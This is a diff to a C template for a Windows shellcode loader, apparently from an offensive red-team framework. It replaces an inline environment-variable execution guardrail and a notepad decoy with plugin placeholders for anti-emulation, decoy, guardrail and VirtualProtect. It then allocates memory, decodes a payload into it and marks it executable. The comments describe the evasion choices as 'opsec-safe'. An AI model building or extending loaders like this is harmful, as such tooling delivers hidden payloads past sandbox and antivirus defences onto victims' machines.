@@ -8,29 +8,35 @@ char *supermega_payload;
 #define p_RX  0x20
 #define p_RWX 0x40
 
-/* iat_reuse_rx
 
-   Standard IAT reuse shellcode
+{{plugin_antiemulation}}
+
+{{plugin_decoy}}
+
+{{plugin_executionguardrail}}
+
+{{plugin_virtualprotect}}
+
+/* VirtualAlloc -> rw -> rx
+
    * create new memory region for the payload
    * will set it to RX (may break some shellcodes, opsec-safe)
 */
 
 int main()
 {
-	// Execution Guardrail: Env Check
-	wchar_t envVarName[] = L"USERPROFILE";
-	wchar_t tocheck[] = L"C:\\Users\\";
-	WCHAR buffer[1024];  // NOTE: Do not make it bigger, or we have a __chkstack() dependency!
-	DWORD result = GetEnvironmentVariableW(envVarName, buffer, 1024);
-	if (result == 0) {
-		return 6;
-	}
-	if (mystrcmp(buffer, tocheck) != 0) { 
-		return 6;
+	DWORD result;
+
+	// Call: Execution Guardrail
+	if (executionguardrail() != 0) {
+		return 1;
 	}
 
-	// Decoy
-	//WinExec("C:\\windows\\system32\\notepad.exe", 1);
+	// Call: Anti Emulation plugin
+	antiemulation();
+
+	// Call: Decoy plugin
+	decoy();
 
 	// Allocate 1
     // char *dest = ...
@@ -44,7 +50,7 @@ int main()
 	// to:   dest[]
 {{ plugin_decoder }}
 
-	if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
+	if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
 		return 7;
 	}
 
@@ -54,13 +60,3 @@ int main()
 	return 0;
 }
 
-int mystrcmp(wchar_t* str1, wchar_t* str2) {
-	int i = 0;
-	while (str1[i] != L'\0' && str2[i] != L'\0') {
-		if (str1[i] != str2[i]) {
-			return 1;
-		}
-		i++;
-	}
-	return 0;
-}
